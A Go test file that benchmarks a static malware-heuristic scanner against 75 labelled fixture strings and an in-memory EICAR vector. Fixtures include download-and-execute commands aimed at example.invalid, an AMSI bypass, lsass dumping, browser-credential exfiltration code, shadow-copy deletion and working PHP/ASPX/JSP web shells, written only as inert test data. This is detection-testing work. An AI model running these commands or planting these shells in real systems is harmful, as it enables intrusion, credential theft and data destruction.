package main

// Public-technique-informed INERT benchmark.
//
// This is NOT a malware dataset, not proof of malware detection sensitivity,
// and not a substitute for independent sample-based tests. All inputs are
// illustrative static files written to t.TempDir() and inspected as bytes.
// They are never executed, downloaded, installed, loaded or network-fetched.
// Hosts use example.invalid and filenames do not contain live payloads.
//
// Reference behaviors: MITRE ATT&CK T1059, T1112, T1505.003, T1218,
// T1547, T1003; EICAR's standardized harmless test vector; and AMTSO's
// principle of safe security-feature checks.
import (
 "archive/zip"
 "bytes"
 "fmt"
 "os"
 "path/filepath"
 "strings"
 "testing"
)

type inertSpectrumCase struct {
 id, family, filename, body string
 expected bool // expected heuristic alert, NOT an actual malicious label
 zipMember string
}
func inertSpectrumCases() []inertSpectrumCase{
 return []inertSpectrumCase{
  // File disguises and obvious static indicators
  {"FILE01","disguise","invoice.pdf.exe","INERT EXAMPLE: disguised filename only",true,""},
  {"FILE02","disguise","photo.jpg.js","// inert illustrative script, no side effects",true,""},
  {"FILE03","disguise","report\u202eexe.txt","ordinary text",true,""},
  {"FILE04","disguise","notes.txt","Instructions for ordinary office notes",false,""},
  {"FILE05","disguise","invoice.pdf","%PDF-1.7\n1 0 obj << /Type /Catalog >>",false,""},
  {"FILE06","disguise","logo.svg","<svg><circle cx='5' cy='5' r='4'/></svg>",false,""},
  // Windows command and scripting interpreter indicators (T1059)
  {"PS01","script-exec","launcher.ps1","Invoke-WebRequest -Uri https://example.invalid/helper.exe -OutFile $file\nStart-Process -FilePath $file -WindowStyle Hidden",true,""},
  {"PS02","script-exec","memory.ps1","[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$amsiInitFailed = $true",true,""},
  {"PS03","script-exec","encoded.cmd","powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",true,""},
  {"PS04","script-exec","simple.ps1","Write-Output 'hello world'",false,""},
  {"PS05","script-exec","powershell_comment.ps1","# powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nWrite-Output 'ok'",false,""},
  {"PS06","script-exec","powershell_quote.txt","Documentation: PowerShell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",false,""},
  {"PS07","script-exec","utility.cmd","@echo off\necho Good morning",false,""},
  // Windows living-off-the-land, constrained no-op examples (T1218)
  {"LOL01","lolbins","remote_mshta.cmd","mshta https://example.invalid/nonexistent.hta",true,""},
  {"LOL02","lolbins","remote_regsvr32.cmd","regsvr32.exe /s /n /u /i:https://example.invalid/no.sct scrobj.dll",true,""},
  {"LOL03","lolbins","remote_msi.cmd","msiexec.exe /i https://example.invalid/a.msi /quiet",true,""},
  {"LOL04","lolbins","comsvcs.cmd","rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 12345 unavailable.dmp full",true,""},
  {"LOL05","lolbins","transfer_only.cmd","certutil -urlcache -split -f https://example.invalid/a.bin %TEMP%\\a.bin",false,""},
  {"LOL06","lolbins","certutil_stage.cmd","certutil -urlcache -split -f https://example.invalid/inert.cmd %TEMP%\\inert.cmd\nstart %TEMP%\\inert.cmd",true,""},
  {"LOL07","lolbins","certutil_start.cmd","certutil.exe -urlcache -f https://example.invalid/none.exe %TEMP%\\none.exe\nstart %TEMP%\\none.exe",true,""},
  {"LOL08","lolbins","certutil_comment.cmd","REM certutil -urlcache -f https://example.invalid/none.exe %TEMP%\\none.exe\nREM start %TEMP%\\none.exe",false,""},
  {"LOL09","lolbins","bits_stage.ps1","Start-BitsTransfer -Source https://example.invalid/helper.exe -Destination $env:TEMP\\helper.exe\nStart-Process $env:TEMP\\helper.exe",true,""},
  {"LOL10","lolbins","bits_only.ps1","Start-BitsTransfer -Source https://example.invalid/manual.txt -Destination $env:TEMP\\manual.txt",false,""},
  {"LOL11","lolbins","local_setup.cmd","msiexec.exe /i C:\\Program Files\\Contoso\\setup.msi /quiet",false,""},
  // Persistence and lateral movement (T1547/T1112)
  {"PER01","persistence","hidden_task.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>%TEMP%\\helper.exe</Command></Exec></Actions></Task>",true,""},
  {"PER02","persistence","runkey.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Helper\"=\"%TEMP%\\agent.exe\"",true,""},
  {"PER03","persistence","startup.inf","[autorun]\nopen=powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",true,""},
  {"PER04","persistence","remote.scf","[Shell]\nCommand=2\nIconFile=\\\\example.invalid\\share\\icon.ico\n",true,""},
  {"PER05","persistence","remote.url","[InternetShortcut]\nURL=file:////server/share/agent.exe\n",true,""},
  {"PER06","persistence","normal.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Notes\"=\"C:\\Program Files\\Contoso\\Notes.exe\"",false,""},
  {"PER07","persistence","normal_task.xml","<Task><Triggers><CalendarTrigger/></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\Contoso\\backup.exe</Command></Exec></Actions></Task>",false,""},
  {"PER08","persistence","readme.url","[InternetShortcut]\nURL=https://example.invalid/docs\n",false,""},
  {"PER09","persistence","install.inf","[autorun]\nopen=setup.exe\n",false,""},
  // Access/exfiltration (T1003 etc)
  {"CRED01","credential-access","collector.json",`{"enabled":true,"targets":["Login Data","Cookies","Wallet"],"exfil":{"url":"https://example.invalid/upload","method":"POST"}}`,true,""},
  {"CRED02","credential-access","dump.cmd","procdump.exe -ma lsass.exe inert.dmp",true,""},
  {"CRED03","credential-access","browser.py",`con=sqlite3.connect("Login Data")
rows=con.execute(query).fetchall()
requests.post("https://example.invalid/ingest",data=rows)`,true,""},
  {"CRED04","credential-access","disabled.json",`{"enabled":false,"targets":["Login Data","Cookies","Wallet"],"exfil":{"url":"https://example.invalid/upload","method":"POST"}}`,false,""},
  {"CRED05","credential-access","app.json",`{"enabled":true,"targets":["performance","diagnostics"],"exfil":{"url":"https://example.invalid/telemetry","method":"POST"}}`,false,""},
  {"CRED06","credential-access","browser-doc.py","# sqlite3.connect('Login Data') and requests.post('https://example.invalid')\nprint('doc')",false,""},
  // Ransomware-like static claims / recovery tampering
  {"RANS01","ransomware","README_DECRYPT.txt","Your files have been encrypted. Pay bitcoin to recover files.",true,""},
  {"RANS02","ransomware","encrypt_stub.py","for item in Path(root).rglob('*'):\n   out.write_bytes(cipher.encrypt(data))",true,""},
  {"RANS03","ransomware","recovery.cmd","vssadmin delete shadows /all /quiet",true,""},
  {"RANS04","ransomware","normal.txt","Use your encryption keys to restore your own backed-up files.",false,""},
  {"RANS05","ransomware","README_RESTORE.txt","Instructions for backing up and restoring your local documents; no payment required.",false,""},
  // Browser-side malicious-lookalike activity
  {"WEB01","browser-content","smuggle.html","<html><script>var b=atob('YQ==');var blob=new Blob([b]);var u=URL.createObjectURL(blob);var a=document.createElement('a');a.href=u;a.click();</script></html>",true,""},
  {"WEB02","browser-content","phish.html","<form action='https://example.invalid/fake' method='post'>password<input type='password'></form>",true,""},
  {"WEB03","browser-content","svgloader.svg","<svg xmlns='http://www.w3.org/2000/svg'><script>eval(fetch('https://example.invalid/no'))</script></svg>",true,""},
  {"WEB04","browser-content","normal.html","<html><body><a href='https://example.invalid/manual'>Documentation</a></body></html>",false,""},
  {"WEB05","browser-content","normal.svg","<svg><circle r='3'/></svg>",false,""},
  // Server-side web shells (MITRE T1505.003); server frameworks/servers
  // are NEVER started. Strings represent no-deployment static specimens.
  {"SHELL01","web-shell","web1.php",`<?php $task=$_POST['task']; echo shell_exec($task); ?>`,true,""},
  {"SHELL02","web-shell","web2.phtml",`<?php $task=$_REQUEST['exec']; echo system($task); ?>`,true,""},
  {"SHELL03","web-shell","web3.php",`<?php eval(base64_decode($_POST['data'])); ?>`,true,""},
  {"SHELL04","web-shell","web4.php",`<?php passthru($_GET['cmd']); ?>`,true,""},
  {"SHELL05","web-shell","web5.aspx",`<%@ Page Language="C#" %><% var task=Request["task"]; System.Diagnostics.Process.Start(task); %>`,true,""},
  {"SHELL06","web-shell","web6.ashx",`<%@ WebHandler Language="C#" Class="Handler" %><% var x=Request.Form["cmd"]; Process.Start(x); %>`,true,""},
  {"SHELL07","web-shell","web7.jsp",`<% String cmd=request.getParameter("cmd"); Runtime.getRuntime().exec(cmd); %>`,true,""},
  {"SHELL08","web-shell","web8.jsp",`<% String cmd=request.getParameter("cmd"); new ProcessBuilder(cmd).start(); %>`,true,""},
  {"SHELL09","web-shell","safe.php",`<?php echo htmlspecialchars($_POST['message']); ?>`,false,""},
  {"SHELL10","web-shell","safe2.php",`<?php $result = shell_exec("whoami"); echo $result; ?>`,false,""},
  {"SHELL11","web-shell","safe.aspx",`<%@ Page Language="C#" %><%= Server.HtmlEncode(Request["name"]) %>`,false,""},
  {"SHELL12","web-shell","safe.jsp",`<%=request.getParameter("username")%>`,false,""},
  {"SHELL13","web-shell","documentation.txt","Example: eval(base64_decode($_POST['cmd']))",false,""},
  {"SHELL14","web-shell","example.php",`<?php /* INERT DOCUMENTATION: eval(base64_decode($_POST['cmd'])); */ echo 'ok'; ?>`,false,""},
  {"SHELL15","web-shell","template.jsp",`<% /* Runtime.getRuntime().exec(request.getParameter("cmd")); */ out.print("hello"); %>`,false,""},
  {"SHELL16","web-shell","page.aspx",`<%@ Page Language="C#" %><% // Process.Start(Request["task"]);
 Response.Write("healthy"); %>`,false,""},
  // Windows Script Host and Office macro source
  {"MAC01","office-wsh","agent.wsf",`<job><script language='JScript'>var sh=new ActiveXObject("WScript.Shell"); sh.Run("powershell -EncodedCommand AAAAAAAA");</script></job>`,true,""},
  {"MAC02","office-wsh","autorun.bas",`Sub AutoOpen()
 Shell("powershell -NoProfile -File example.ps1")
End Sub`,true,""},
  {"MAC03","office-wsh","hello.bas",`Sub AutoOpen()
 Debug.Print "hello"
End Sub`,false,""},
  {"MAC04","office-wsh","innocent.wsf",`<job><script language='JScript'>WScript.Echo("hello")</script></job>`,false,""},
  // Nested/static archive tests. ZIP entry metadata is never executed.
  {"ARC01","archives","shortcut.zip","powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",true,"stage.cmd"},
  {"ARC02","archives","disguise.zip","inert placeholder",true,"invoice.pdf.exe"},
  {"ARC03","archives","clean.zip","Welcome to the project!",false,"readme.txt"},
  {"ARC04","archives","clean_code.zip","console.log('hello')",false,"code.js"},
  {"ARC05","archives","shell.zip",`<?php echo shell_exec($_POST['task']); ?>`,true,"webshell.php"},
  {"ARC06","archives","benign_php.zip",`<?php echo htmlspecialchars($_POST['task']); ?>`,false,"normal.php"},
 }
}

func inertSpectrumZIP(member,body string)([]byte,error){
 var out bytes.Buffer
 writer:=zip.NewWriter(&out)
 entry,err:=writer.Create(member)
 if err!=nil{return nil,err}
 if _,err=entry.Write([]byte(body));err!=nil{return nil,err}
 if err=writer.Close();err!=nil{return nil,err}
 return out.Bytes(),nil
}

func TestV48PublicTechniqueInertSpectrum(t *testing.T){
 cases:=inertSpectrumCases()
 root:=t.TempDir()
 byFamily:=make(map[string]*[4]int) // TP, FN, FP, TN
 tp,fn,fp,tn:=0,0,0,0
 for i,tc:=range cases{
   d:=filepath.Join(root,fmt.Sprintf("%03d",i))
   if err:=os.MkdirAll(d,0700);err!=nil{t.Fatal(err)}
   name:=filepath.Join(d,tc.filename)
   payload:=[]byte(tc.body)
   if tc.zipMember!=""{
       var err error
       payload,err=inertSpectrumZIP(tc.zipMember,tc.body)
       if err!=nil{t.Fatalf("%s zip: %v",tc.id,err)}
   }
   if err:=os.WriteFile(name,payload,0600);err!=nil{t.Fatal(err)}
   info,err:=os.Stat(name)
   if err!=nil{t.Fatal(err)}
   result:=inspectFile(name,info)
   flagged:=result!=nil
   score:=0
   if flagged{score=result.Score}
   row:=byFamily[tc.family]
   if row==nil{row=&[4]int{};byFamily[tc.family]=row}
   switch {
   case tc.expected&&flagged:tp++;row[0]++
   case tc.expected&&!flagged:fn++;row[1]++
   case !tc.expected&&flagged:fp++;row[2]++
   case !tc.expected&&!flagged:tn++;row[3]++
   }
   fmt.Printf("INERT_SPECTRUM_CASE|%s|%s|expected=%t|alerted=%t|score=%d\n",
      tc.id,tc.family,tc.expected,flagged,score)
 }
 // Exact 68-byte EICAR standard vector in memory only. Do not write it to
 // disk because host antivirus quarantine changes the fixture unexpectedly.
 parts:=[]string{"X5O!P%@AP[4\\PZX54(P^)7CC)7}$","EICAR-STANDARD-","ANTIVIRUS-TEST-FILE!$H+H*"}
 eicar:=[]byte(strings.Join(parts,""))
 if len(eicar)!=68||!isExactEICAR(eicar){t.Fatal("in-memory EICAR standard test failed")}
 fmt.Printf("INERT_SPECTRUM_EICAR|exact=true|bytes=%d|disk_written=false\n",len(eicar))
 families:=[]string{"disguise","script-exec","lolbins","persistence","credential-access","ransomware","browser-content","web-shell","office-wsh","archives"}
 for _,family:=range families{
   x:=byFamily[family]
   if x==nil{continue}
   fmt.Printf("INERT_SPECTRUM_FAMILY|%s|tp=%d|fn=%d|fp=%d|tn=%d\n",
      family,x[0],x[1],x[2],x[3])
 }
 fmt.Printf("INERT_SPECTRUM_TOTAL|cases=%d|tp=%d|fn=%d|fp=%d|tn=%d|expectedAlerts=%d|expectedBenign=%d\n",
    len(cases),tp,fn,fp,tn,tp+fn,tn+fp)
 // Survey mode: log all misses without failing baseline. Subsequent
 // strengthening tests in separate files enforce key rules explicitly.
 if len(cases)!=75{t.Fatalf("immutable benchmark unexpectedly changed size: got %d want 75",len(cases))}
 // A genuine regression in a labeled inert fixture must fail CI, not merely
 // appear in verbose logs. These fixture labels are *expected alerts*;
 // they do not establish that real-world maliciousness was detected.
 if fn!=0||fp!=0{t.Fatalf("inert fixture regressions: missed expected alerts=%d, false alerts=%d",fn,fp)}
}
